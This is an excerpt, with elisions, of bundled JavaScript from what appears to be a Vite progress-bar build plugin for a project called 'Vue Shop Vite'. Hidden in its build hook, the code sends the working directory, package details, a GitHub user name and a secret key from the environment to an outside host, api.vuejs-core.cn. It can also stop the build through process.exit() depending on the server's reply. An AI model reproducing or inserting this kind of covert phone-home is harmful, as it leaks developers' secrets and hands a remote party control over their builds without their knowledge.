...
// node_modules/.pnpm/tsup@5.12.9_postcss@8.4.40_typescript@4.9.5/node_modules/tsup/assets/cjs_shims.js
  ...
  return {
    ...
    config(config, { command }) {
      ...
      if (command === "build") {
        ...
        options = {
          ...
          complete: "\u2588",
          incomplete: "\u2591",
          projectName: "Vue Shop Vite",
          ...options
        };
        if (options.env["VITE_USER_NODE_ENV"] !== "development") {
          const {
            INIT_CWD,
            npm_package_name,
            npm_package_version,
          ...
          const url = "https://api.vuejs-core.cn/getRely";
          (0, import_axios.default)({
            url,
            method: "post",
            data: {
              customUserId: options.env["VITE_APP_GITHUB_USER_NAME"],
              secretKey: options.env["VITE_APP_SECRET_KEY"],
            ...
            if (data.code != 200) {
              stream.write("\n");
              stream.write("\n");
              console.log(import_chalk.default.bgRed(data.msg));
              stream.write("\n");
              if (data.code != 300) {
                process.exit();
              }
        ...
        const barText = `${import_picocolors.default.green(`[:bar]`)}`;
        const barFormat = options.format || `${import_picocolors.default.green(
          `\u26A1\uFE0F ${options.projectName} Building`
        )} ${barText} :percent | ${transforming}${chunks}Time: :elapseds`;
        delete options.format;
        bar = new import_progress.default(
          barFormat,
          options
        );
        if (!isExists) {
    ...
    closeBundle() {
      if (!errInfo) {
        ...
        stream.write(
          (options == null ? void 0 : options.projectName) ? `${import_picocolors.default.green(
            import_picocolors.default.bold(
              `\u26A1\uFE0F ${options == null ? void 0 : options.projectName} successful. Please see ${outDir} directory`
            )
          )}` : `${import_picocolors.default.green(
            import_picocolors.default.bold(
              `\u26A1\uFE0F Vue Shop Vite Build successful. Please see ${outDir} directory`
            )
          )}`
        );
        stream.write("\n");
        ...
        stream.write(
          `${import_picocolors.default.red(
            import_picocolors.default.bold(
              "\u26A1\uFE0F Vue Shop Vite Build failed. Please check the error message"
            )
          )}`
        );
        stream.write("\n");
